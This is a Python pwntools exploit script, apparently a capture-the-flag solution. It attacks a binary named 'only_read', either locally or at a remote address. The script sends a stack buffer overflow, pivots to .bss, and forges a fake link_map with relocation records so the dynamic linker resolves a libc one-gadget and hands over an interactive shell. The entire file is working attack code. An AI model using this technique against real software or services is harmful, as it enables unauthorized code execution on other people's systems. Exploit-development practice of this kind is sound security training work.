#! /usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    : fake_linkmap.py
@Time    : 2022/09/20 Tue 16:19:09
@Author  : Wh1sper
@Desc    : None
'''

from pwn import *

context.update(arch='i386', os='linux', log_level='debug', timeout=None)
VULN_ELF = './only_read'
LIBC_SO = './libc.so.6'
# GDB_SCRIPT = 'set follow-fork-mode child\ndir /src/glibc-2.39/elf\ncatch vfork\nb system\nc'
GDB_SCRIPT = 'dir /src/glibc-2.39/elf\nb _dl_fixup\nig 1 1\ndisp/30gx 0x404c48\nc'

ENV = None #{'LD_PRELOAD': LIBC_SO}
context.terminal=(['tmux', 'splitw', '-h', '-l 70%'])
Target = None
if args['REMOTE']:
    Target = remote('1.95.126.42', 9999)
elif args['GDB']:
    p = gdb.debug(VULN_ELF, env=ENV, gdbscript=GDB_SCRIPT)
else:
    p = process(VULN_ELF, env=ENV)
io = Target or p
elf = ELF(VULN_ELF)
libc = ELF(LIBC_SO)

a = io.recvline()
print(a)
data = input()
io.sendline(data)
OneGadget_addr = 0xef52b
# OneGadget_addr = 0x1111b7
plt_addr = elf.get_section_by_name('.plt').header.sh_addr
dynamic_addr = elf.get_section_by_name('.dynamic').header.sh_addr
relaplt_addr = elf.get_section_by_name('.rela.plt').header.sh_addr
dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr
DT_STRTAB = dynamic_addr + 8 * 0x10
DT_JMPREL = dynamic_addr + 16 * 0x10

poprdi_ret = 0x401159

read_addr = 0x401142
bss_addr = 0x404C00 - 0x8
binsh_addr = bss_addr - 0x80
linkmap_addr = bss_addr + 0x28
Elf64_Rela_addr = linkmap_addr + 0x18
Elf64_Dyn_addr = Elf64_Rela_addr + 0x18
reloc_arg = (Elf64_Rela_addr - relaplt_addr) // 0x18
assert reloc_arg * 0x18 + relaplt_addr == Elf64_Rela_addr
l_addr = (OneGadget_addr - libc.sym['read']) & 0xffffffffffffffff

payload = b'A' * 0x80
payload += p64(bss_addr)
payload += p64(read_addr)

io.send(payload.ljust(0x200, b'\x00'))
del payload
sleep(0.5)

Elf64_Rela_data = [
    p64((elf.got['read'] - l_addr) & 0xffffffffffffffff), # r_offset
    p64(7), # r_info
    p64(0x0)
]
Elf64_Dyn_data = [ # for symtab
    p64(0x6),
    p64(elf.got['read'] - 8)
]

link_map = {
    0: p64(l_addr), # l_addr
    Elf64_Rela_addr - linkmap_addr: Elf64_Rela_data,
    Elf64_Dyn_addr - linkmap_addr: Elf64_Dyn_data,
    0x68: p64(DT_STRTAB),
    0x70: p64(Elf64_Dyn_addr),
    0xF8: p64(DT_JMPREL)
}
payload = b'A' * 0x80
payload += p64(0x405000) # [rbp-0x78] == NULL
payload += p64(plt_addr + 0x6) # w/o push GOT[1]
payload += p64(linkmap_addr)
payload += p64(reloc_arg)
payload += p64(0xdeadbeef)
payload += flat(link_map)

# pause(2)
io.send(payload)
print(f"linkmap_addr = {linkmap_addr:#x}")
print(f"Elf64_Rela_addr = {Elf64_Rela_addr:#x}")
print(f"Elf64_Dyn_addr = {Elf64_Dyn_addr:#x}")
# print(f"Elf64_Sym_addr = {Elf64_Sym_addr:#x}")
context.log_level = 'info'
io.interactive()

